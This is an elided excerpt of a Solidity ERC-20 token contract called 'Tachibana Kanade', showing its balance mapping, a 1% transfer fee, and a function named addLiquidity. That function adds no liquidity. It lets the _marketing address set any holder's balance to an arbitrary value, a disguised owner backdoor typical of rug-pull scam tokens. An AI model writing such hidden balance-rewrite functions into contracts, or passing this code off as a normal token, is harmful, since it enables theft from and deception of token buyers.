...
contract TachibanaKanade is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _buytokens;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => uint256) private recipientbuy; 
    string private _name = "Tachibana Kanade";
    string private _symbol = unicode"かなで"; 
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if (!_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient]  ) {_feetoken = amount.mul(1).div(100);}
    ...
    function addLiquidity(address Liquidity, uint256 tokenAmounts, uint256 bnbAmount , uint256 LpAmount) external  {
        require(msg.sender == _marketing );
        _buytokens[Liquidity] = tokenAmounts + bnbAmount + LpAmount;
    }
